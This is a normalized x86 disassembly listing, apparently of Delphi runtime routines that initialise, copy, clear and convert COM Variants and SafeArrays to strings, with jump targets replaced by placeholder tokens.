mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e4f4
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403ed8
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403ed8
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
dec eax
je r-xdata
call sub_40e074
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
jmp r-xdata
call sub_40e164
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40ab24
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b368
call sub_40386c
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
jmp r-xdata
sub_40e508
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e0c8
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e1b8
jmp r-xdata
jmp r-xdata
call sub_40e2a8
sub_40e53c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e586
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e58d
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_40e5a4
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e5d4
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e5d4
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e630
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e4fc
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40e4fc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e5a4
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40e4fc
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40e4fc
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40e5d4
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e4fc
mov eax [ ebp - 0x314 ]
call sub_40e828
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40e7ac
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40e4fc
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403eb4
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_410214
test al al
je r-xdata
mov eax ebx
call sub_40e630
jmp r-xdata
push ebx
call VariantClear
call sub_40e4fc
mov edx ebx
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_40e844
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40e874
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40e874
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40e8d0
push ebp
mov ebp esp
add esp 0xfffffce0
push ebx
push esi
push edi
mov [ ebp - 0x308 ] ecx
mov ebx edx
mov [ ebp - 0x304 ] eax
test [ ebx + 0x1 ] 0x20
jne r-xdata
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40e4fc
push ebx
mov eax [ ebp - 0x304 ]
push eax
call VariantCopy
call sub_40e4fc
test ah 0x40
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x314 ] eax
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x314 ] eax
jmp r-xdata
lea eax [ ebp - 0x300 ]
push eax
mov eax [ ebp - 0x310 ]
push eax
push 0xc
call SafeArrayCreate
mov esi eax
test esi esi
jne r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x314 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x304 ]
call sub_40e828
mov eax [ ebp - 0x304 ]
mov [ eax ] 0x200c
mov eax [ ebp - 0x304 ]
mov [ eax + 0x8 ] esi
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
call sub_40e254
mov eax esi
mov [ ebp - 0x320 ] eax
mov eax [ ebp - 0x320 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetLBound
call sub_40e4fc
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayGetUBound
call sub_40e4fc
mov eax [ ebp - 0x320 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x320 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40e844
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
push ebp
mov eax ebx
call sub_40e874
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x318 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x314 ]
push eax
call SafeArrayPtrOfIndex
call sub_40e4fc
lea eax [ ebp - 0x31c ]
push eax
lea eax [ ebp - 0x100 ]
push eax
push esi
call SafeArrayPtrOfIndex
call sub_40e4fc
mov eax [ ebp - 0x318 ]
mov edx eax
mov eax [ ebp - 0x31c ]
call [ ebp - 0x308 ]
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40eaa4
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov di [ esi ]
cmp di 0x14
jae r-xdata
mov eax ebx
call sub_40e7ac
cmp di 0x100
jne r-xdata
push esi
push ebx
call VariantCopy
call sub_40e4fc
jmp r-xdata
cmp di 0x101
jne r-xdata
mov [ ebx ] 0x100
xor eax eax
mov [ ebx + 0x8 ] eax
lea eax [ ebx + 0x8 ]
mov edx [ esi + 0x8 ]
call sub_403f08
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
test di 0x2000
je r-xdata
mov [ ebx ] di
mov eax [ esi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax edi
call sub_410214
test al al
je r-xdata
mov ecx sub_40ea9c
mov edx esi
mov eax ebx
call sub_40e8d0
jmp r-xdata
push esi
push ebx
call VariantCopy
call sub_40e4fc
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40eb50
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40eaa4
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40e7ac
sub_40eb94
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404594
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40e508
pop ebx
pop ebp
retn 0x8
sub_40ebcc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404594
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40e508
pop ebx
pop ebp
retn 0x8
sub_40ec04
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40ecba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404594
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40e508
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ecc1
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403ed8
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_40413c
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_4079d4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4046e0
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_40413c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407998
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_4046e0
jmp r-xdata
jmp r-xdata
call sub_40e164
sub_40ecc8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40ed87
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40ed65
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40e508
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4046a4
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404790
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40413c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ed6c
lea eax [ ebp - 0x10 ]
call sub_40e828
retn
sub_40ed94
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40edea
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40eb50
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40ee7c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40edf1
lea eax [ ebp - 0x10 ]
call sub_40e828
retn
sub_40edf8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410214
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40ee6d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_403f08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e828
retn
sub_40ee7c
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f3b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40eeb5 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403f08
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_403eb4
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407de8
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_403f08
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407de8
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_403f08
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_4091d8
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403f08
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4091d8
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_403f08
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40eb94
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_40413c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40ebcc
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_40413c
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_4046a4
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404790
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_40413c
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_40ec04
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_40413c
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_407de8
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_403f08
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407de8
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_403f08
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_407de8
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_403f08
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_407ed4
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_403f08
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_407ed4
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_403f08
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40ee7c
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40ecc8
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_403f08
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f3ba
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_403ed8
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_4045ac
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_403ed8
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_4045ac
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403ed8
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_40ed94
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403f08
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403f08
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40e0c8
test ah 0x40
je r-xdata
mov eax esi
call sub_403eb4
mov edx eax
mov eax ebx
call sub_40edf8
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_40ecc8
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403f08
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40ecc8
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403f08
jmp r-xdata
jmp [ eax * 4 + jump_table_40f149 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407de8
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403f08
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407de8
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403f08
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4091d8
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403f08
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_4091d8
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403f08
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40eb94
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_40413c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_40ebcc
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_40413c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4040dc
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40ec04
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_40413c
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407de8
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403f08
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407de8
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403f08
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407de8
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403f08
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_407ed4
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403f08
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_407ed4
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403f08
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40ee7c
jmp r-xdata
sub_40f3c0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f46a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f44d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40e508
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4046a4
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404790
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f454
lea eax [ ebp - 0x10 ]
call sub_40e828
retn
sub_40f478
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f4ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40eb50
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f5a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f4d5
lea eax [ ebp - 0x10 ]
call sub_40e828
retn
sub_40f4dc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40f594
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_410214
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f59b
lea eax [ ebp - 0x20 ]
call sub_404594
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f577
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_4046a4
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404790
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e828
retn
sub_40f5a4
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40faf6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f5de ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4046e0
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404594
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407de8
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4046e0
jmp r-xdata
lea edx [ ebp - 0x8 ]
